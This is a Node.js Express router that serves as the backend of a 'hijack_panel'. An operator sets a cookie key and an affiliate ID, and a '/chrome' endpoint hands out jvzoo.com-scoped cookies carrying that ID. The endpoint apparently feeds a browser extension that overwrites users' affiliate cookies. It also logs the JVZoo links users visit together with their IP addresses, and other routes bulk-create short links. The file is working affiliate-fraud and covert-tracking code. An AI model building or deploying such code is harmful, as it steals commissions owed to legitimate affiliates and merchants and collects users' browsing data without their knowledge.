var express = require('express');
var router = express.Router();
var handler = require("../lib/Handler")

/* login page. */
router.get('/', async function (req, res, next) {

  var page = await handler.Download("http://localhost:3000/test.html")
  res.render('index', {
    title: 'ClickEmbed',
    body: page
  });

});
/* dashboard. */
router.get('/dashboard', function (req, res, next) {

  res.render('dashboard', {
    title: 'Smple Admin',
    users: [],
    error: "",
    success: "",
    affiliate_id: "",
    cookie_key: ""
  });

});
router.post('/dashboard', async function (req, res, next) {
  var error = ""
  var success = ""
  //console.log(req.body)
  var error = ""
  var {
    set_hijack,
    cookie_key,
    affiliate_id
  } = req.body

  console.log(req.body)
  if (!cookie_key) {
    error = "Cookie key is required";
  }
  if (affiliate_id == "") {
    error = "Affiliate ID is required";
  }

  if (!error) {
    var is_h = await handler.bindRawQuery("select id from hijack_panel where cookie_key = $cookie_key", {
      cookie_key: cookie_key
    });
    console.log(is_h.length)
    if (is_h.length > 0) {
      var id = is_h[0]["id"];
      //: update
      handler.bindRawQuery("update hijack_panel set status = 'inactive' where id > 0")

      handler.genUpdate({
        affiliate_id: affiliate_id,
        "cookie_key": cookie_key,
        "status": "active",
        "network": "jvz"
      }, "hijack_panel", {
        id: id
      })
      success = "Set successfully";
    } else {
      handler.bindRawQuery("update hijack_panel set status = 'inactive' where id > 0");
      var ins = {
        "affiliate_id": affiliate_id,
        "cookie_key": cookie_key,
        "status": "active",
        "network": "jvz"
      };
      await handler.genInsert(ins, "hijack_panel");
      success = "Set successfully";
    }


  }

  res.render('dashboard', {
    title: 'Smple Admin',
    users: [],
    error: error,
    success: success,
    affiliate_id,
    cookie_key
  });

});
/* dashboard. */
router.get('/chrome', async function (req, res, next) {
  var link = req.body.u
  //: IF ANY IS SET ACTIVE
  var is_hh = await handler.bindRawQuery("select * from hijack_panel where status = 'active' order by id desc limit 1", {});

  if (is_hh.length > 0) {

    var cookie_key = is_hh[0].cookie_key
    var affiliate_id = is_hh[0].affiliate_id
    var m2 = {
      url: "https://www.jvzoo.com",
      name: cookie_key,
      value: affiliate_id
    }
    var m3 = {
      url: "https://www.jvzoo.com",
      name: cookie_key,
      value: affiliate_id,
      domain: ".jvzoo.com"
    }
    var domain = handler.GetDomain(link)
    if (domain == 'jvzoo.com' || domain == 'www.jvzoo.com') {
      await handler.genInsert({
        "link": link,
        "ip": handler.ip(req)
      }, "users")
    }

    res.json({
      m2: m2,
      m3: m3
    })


  } else {
    res.json({
      message: "No active campaign set"
    })
  }




});

router.get('/url-shortner', async function (req, res, next) {
  
     var starter = handler.StarterDigit()
     var char = await handler.ShortID(starter)
     await handler.genInsert({
       short_link: char,
       long_link: "https://google.com"
     }, "user_links")
   
 
    //: not
    res.send(char.toString())
  

});
router.get('/bulk-url-shortner', async function (req, res, next) {
  var links = [] 
   
  for(var i = 0; i < 1000; i++){
     var starter = handler.StarterDigit()
     var char = await handler.ShortID(starter)
     await handler.genInsert({
       short_link: char,
       long_link: "https://google.com"
     }, "user_links")
     links.push("http://localhost:3000/"+char)
  }
 
    //: not
    res.send(links.join("<br>").toString())
  

});
module.exports = router;